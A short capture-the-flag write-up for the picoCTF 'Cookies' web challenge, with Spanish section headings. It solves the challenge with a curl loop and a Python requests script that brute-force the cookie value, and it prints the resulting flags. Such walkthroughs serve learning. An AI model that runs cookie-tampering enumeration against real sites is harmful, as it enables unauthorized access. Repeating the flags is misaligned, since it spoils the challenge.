## Objetivo 

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:6418/](http://mercury.picoctf.net:6418/)
## Solución  

```java

┌──(kali㉿kali)-[~]
└─$ for i in {0..30}; do curl -s http://mercury.picoctf.net:6418/check -H "Cookie: name=$i"; done | grep "picoCTF{"
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_88acab36}</code></p>
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ 

```


## Solucion 2



```java


──(kali㉿kali)-[~]
└─$ nano cookies.py
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ cat cookies.py                                
import requests
import re

url = "http://mercury.picoctf.net:17781/check"

for i in range(20):
        print(i)
        cookies = {'name':f'{i}'}
        r = requests.get(url, cookies=cookies)
        if 'picoCTF{' in r.text:
                flag = re.findall('picoCTF\\{.*?\\}',r.text)
                print(flag)
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ python cookies.py   
0
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
['picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}']
19
                      
```
## Notas Adicionales 



### Referencias